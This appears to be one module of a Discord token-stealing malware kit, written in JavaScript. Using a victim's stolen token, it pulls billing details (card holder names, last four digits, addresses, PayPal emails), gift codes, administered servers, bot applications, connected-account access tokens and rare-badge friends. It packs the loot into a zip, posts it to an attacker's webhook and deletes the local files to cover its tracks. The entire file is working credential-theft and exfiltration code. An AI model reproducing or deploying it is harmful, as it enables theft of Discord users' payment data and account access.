const fs = require('fs');
const AdmZip = require('adm-zip');
const Discord = require("discord.js");
const { discord, rbadges } = require("./all.js");
const zip = async (token, user, id, webhook) => {
    fs.access(`./${id}`, (error) => { if (error) return; })
    fs.mkdir(`./${id}`, { recursive: true }, (error) => { if (error) return; })
    const bill = await discord("https://discord.com/api/v9/users/@me/billing/payment-sources", token);
    const gi = await discord("https://discord.com/api/v8/users/@me/entitlements/gifts", token);
    const gi2 = await discord("https://discord.com/api/v9/users/@me/outbound-promotions/codes", token);
    const gu = await discord("https://discord.com/api/v9/users/@me/guilds", token);
    const bo = await discord("https://discord.com/api/v9/applications", token);
    const coo = await discord("https://discordapp.com/api/v9/users/@me/connections", token);
    const amis = await discord("https://discordapp.com/api/v9/users/@me/relationships", token);
    let guu = "";
    let p = "";
    let boo = "";
    let gif = "";
    let co = "";
    let fi = "";
    let a = "Zip folder's content:\n\n";
    if (gu) gu.forEach(e => { if (e.owner) { guu += `GUILD: ${e.name} (${e.id}) | OWNER: true | ADMIN: TRUE\n` } else if (e.permissions.startsWith("4")) { guu += `GUILD: ${e.name} (${e.id}) | OWNER: false | ADMIN: TRUE\n` } })
    if (bo) bo.forEach(e => { if (e.bot) { boo += `BOT: ${e.bot.username}#${e.bot.discriminator} (${e.bot.id}) | FLAGS: ${e.flags !== 0 ? "yes" : "no"} | VERIF: ${(e.public_flags && 65536) === 65536 ? "yes" : "no"}\n` } })
    if (gi) gi.forEach(e => { if (e) gif += `TYPE: Nitro | CODE: ${e}\n` })
    if (gi2) gi2.forEach(e => { if (e.code) gif += `TYPE: ${e.promotion.outbound_title} | CODE: ${e.code}\n` })
    if (bill) bill.forEach(i => { if (i.brand && 0 == i.invalid) p += `TYPE: Card | DEFAULT: ${i.default} | NAME: ${i.billing_address.name} | NUMBER: ************${i.last_4} | EXPIRES: ${i.expires_month}/${i.expires_year} | BRAND: ${i.brand} | ADRESS: ${i.billing_address.line_1} [${i.billing_address.country}] (${i.billing_address.city}, ${i.billing_address.postal_code}, ${i.billing_address.state})\n`; if (i.email) p += `TYPE: Paypal | DEFAULT: ${i.default} | NAME: ${i.billing_address.name} | EMAIL: ${i.email} | ADRESS: ${i.billing_address.line_1} [${i.billing_address.country}] (${i.billing_address.city}, ${i.billing_address.postal_code}, ${i.billing_address.state})\n`; })
    if (coo) coo.forEach(e => { if (e.type) { co += `TYPE: ${e.type} | NAME: ${e.name} (${e.id}) | TOKEN: ${e.access_token || "Non"}\n` } })
    const r = amis.filter((user) => { return user.type == 1 })
    for (z of r) {
        let b = rbadges(z.user.public_flags)
        if (b != "") { fi += `USER: ${z.user.username}#${z.user.discriminator} | BADGES: ${b}\n` }
    };
    let zip = new AdmZip();
    if (guu != "") {
        let pp = `@~$~@llx404-${user}\n${guu}`;
        fs.writeFileSync(`./${id}/Guilds.txt`, pp, function (err) { if (err) return });
        zip.addLocalFile(`./${id}/Guilds.txt`);
        const { size } = fs.statSync(`./${id}/Guilds.txt`);
        a += `📄 Guilds.txt - ${sz(size)}\n`;
        setTimeout(() => { fs.unlink(`./${id}/Guilds.txt`, (err) => { if (err) console.log(err) }) }, 5000);
    };
    if (p != "") {
        let pp = `@~$~@llx404-${user}\n${p}`;
        fs.writeFileSync(`./${id}/Billing.txt`, pp, function (err) { if (err) return });
        zip.addLocalFile(`./${id}/Billing.txt`);
        const { size } = fs.statSync(`./${id}/Billing.txt`);
        a += `📄 Billing.txt - ${sz(size)}\n`;
    };
    if (boo != "") {
        let pp = `@~$~@llx404-${user}\n${boo}`;
        fs.writeFileSync(`./${id}/Bot.txt`, pp, function (err) { if (err) return });
        zip.addLocalFile(`./${id}/Bot.txt`);
        const { size } = fs.statSync(`./${id}/Bot.txt`);
        a += `📄 Bot.txt - ${sz(size)}\n`;
    };
    if (gif != "") {
        let pp = `@~$~@llx404-${user}\n${gif}`;
        fs.writeFileSync(`./${id}/Gift.txt`, pp, function (err) { if (err) return });
        zip.addLocalFile(`./${id}/Gift.txt`);
        const { size } = fs.statSync(`./${id}/Gift.txt`);
        a += `📄 Gift.txt - ${sz(size)}\n`;
    };
    if (co != "") {
        let pp = `@~$~@llx404-${user}\n${co}`;
        fs.writeFileSync(`./${id}/Connections.txt`, pp, function (err) { if (err) return });
        zip.addLocalFile(`./${id}/Connections.txt`);
        const { size } = fs.statSync(`./${id}/Connections.txt`);
        a += `📄 Connections.txt - ${sz(size)}\n`;
    };
    if (fi != "") {
        let pp = `@~$~@llx404-${user}\n${fi}`;
        fs.writeFileSync(`./${id}/RareFriends.txt`, pp, function (err) { if (err) return });
        zip.addLocalFile(`./${id}/RareFriends.txt`);
        const { size } = fs.statSync(`./${id}/RareFriends.txt`);
        a += `📄 RareFriends.txt - ${sz(size)}\n`;
    };
    zip.writeZip(`zi-${id}.zip`)
    const attachment = new Discord.MessageAttachment(`zi-${id}.zip`, `${id}.zip`);
    webhook.send(attachment);
    setTimeout(() => { fs.unlink(`zi-${id}.zip`, (err) => { if (err) console.log(err) }); fs.rmdir(`./${id}`, { recursive: true }, (err) => { if (err) { throw err; } }); }, 5000)
    return a;
};
module.exports = zip;

function sz(size) {
    const i = Math.floor(Math.log(size) / Math.log(1024));
    return (size / Math.pow(1024, i)).toFixed(2) * 1 + " " + ['B', 'KB', 'MB', 'GB', 'TB'][i];
};
